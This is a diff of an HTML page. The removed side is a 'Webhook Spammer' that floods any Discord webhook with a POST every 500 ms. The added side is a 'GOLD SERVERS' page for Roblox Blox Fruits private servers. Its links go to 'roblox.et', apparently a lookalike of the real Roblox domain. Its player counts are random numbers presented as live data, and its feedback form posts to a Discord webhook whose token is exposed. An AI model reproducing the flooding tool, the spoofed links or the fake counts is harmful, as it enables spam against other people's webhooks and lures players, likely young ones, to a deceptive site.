@@ -2,75 +2,117 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Webhook Spammer</title>
+    <title>GOLD SERVERS</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            text-align: center;
-            background: #111;
+            background: linear-gradient(45deg, #1e3c72, #2a5298);
             color: white;
+            text-align: center;
+            animation: fadeIn 2s ease-in-out;
         }
-        .container {
-            margin-top: 50px;
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
         }
-        input, button {
+        .server-box, .dashboard-box, .feedback-box {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            margin: 20px auto;
+            border-radius: 10px;
+            width: 50%;
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
+            transition: transform 0.3s ease;
+        }
+        .server-box:hover, .dashboard-box:hover, .feedback-box:hover {
+            transform: scale(1.05);
+        }
+        .server-box a {
+            text-decoration: none;
+            color: #00ff00;
+            font-size: 20px;
+        }
+        .countdown, .player-count {
+            margin-top: 10px;
+        }
+        .dashboard-box {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            font-size: 18px;
+            color: #ffcc00;
             padding: 10px;
-            margin: 10px;
-            border: none;
             border-radius: 5px;
         }
-        button {
-            background: red;
-            color: white;
-            cursor: pointer;
-        }
-        .watermark {
-            position: fixed;
-            bottom: 10px;
-            left: 10px;
-            font-size: 12px;
-            opacity: 0.7;
+        input, button {
+            padding: 8px;
+            margin: 5px;
+            border-radius: 5px;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Webhook Spammer</h1>
-        <input type="text" id="webhookUrl" placeholder="Enter Webhook URL">
-        <input type="text" id="message" placeholder="Enter Message">
-        <input type="text" id="extraText" placeholder="Enter Extra Text">
-        <label>
-            <input type="checkbox" id="embedOption"> Enable Embed
-        </label>
-        <button onclick="startSpam()">Start Spamming</button>
-    </div>
-    <div class="watermark">Join: <a href="https://discord.gg/Hhgd5SsMfA" target="_blank">discord.gg/Hhgd5SsMfA</a></div>
-    <script>
-        function startSpam() {
-            const webhookUrl = document.getElementById('webhookUrl').value;
-            const message = document.getElementById('message').value;
-            const extraText = document.getElementById('extraText').value;
-            const embedEnabled = document.getElementById('embedOption').checked;if (!webhookUrl || !message) {
-            alert("Please fill in all fields");
-            return;
-        }
+    <h1>GOLD SERVERS</h1><div class="dashboard-box">More private servers coming soon...</div>
 
-        const data = embedEnabled ? {
-            username: "void on top",
-            embeds: [{ description: message + " " + extraText, color: 16711680 }]
-        } : { 
-            username: "void on top",
-            content: message + " " + extraText 
-        };
+<div class="server-box">
+    <p><a href="https://www.roblox.et/games/2753915549/Blox-Fruits?privateServerLinkCode=59816836148209918793607839663756" target="_blank">Bloxfruit Server 1</a></p>
+    <p class="player-count" id="server1-count">Loading players...</p>
+</div>
 
+<div class="server-box">
+    <p><a href="https://www.roblox.et/games/2753915549/Blox-Fruits?privateServerLinkCode=59816836148209918793607839663756" target="_blank">Bloxfruit Server 2</a></p>
+    <p class="player-count" id="server2-count">Loading players...</p>
+</div>
+
+<h2>Server Restart In: <span id="countdown">60:00</span></h2>
+
+<h2>Feedback</h2>
+<div class="feedback-box">
+    <p>Report bugs or rate our site</p>
+    <input type="text" id="feedback" placeholder="Enter your feedback">
+    <button onclick="sendFeedback()">Send</button>
+</div>
+
+<script>
+    function randomPlayers() {
+        return Math.floor(Math.random() * 13);
+    }
+
+    function updatePlayerCounts() {
+        document.getElementById("server1-count").innerText = `Players: ${randomPlayers()}/12`;
+        document.getElementById("server2-count").innerText = `Players: ${randomPlayers()}/12`;
+    }
+    
+    function startCountdown() {
+        let timeLeft = 3600;
         setInterval(() => {
-            fetch(webhookUrl, {
+            timeLeft--;
+            let minutes = Math.floor(timeLeft / 60);
+            let seconds = timeLeft % 60;
+            document.getElementById("countdown").innerText = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+            if (timeLeft === 0) {
+                timeLeft = 3600;
+                updatePlayerCounts();
+            }
+        }, 1000);
+    }
+
+    function sendFeedback() {
+        let feedback = document.getElementById("feedback").value;
+        if (feedback) {
+            fetch("https://discord.com/api/webhooks/1306937739702308915/-kxWY0Xk3Ci95HR7DjHZyw2BcMSc3CvkwMwllTDEOve0LmozUU3QgGT8k51FtCCylQiI", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(data)
-            }).catch(err => console.error("Error sending webhook:", err));
-        }, 500);
+                body: JSON.stringify({ content: `New Feedback: ${feedback}` })
+            });
+            alert("Feedback sent!");
+            document.getElementById("feedback").value = "";
+        }
     }
+
+    setInterval(updatePlayerCounts, 3600000);
+    startCountdown();
+    updatePlayerCounts();
 </script>
 
 </body>
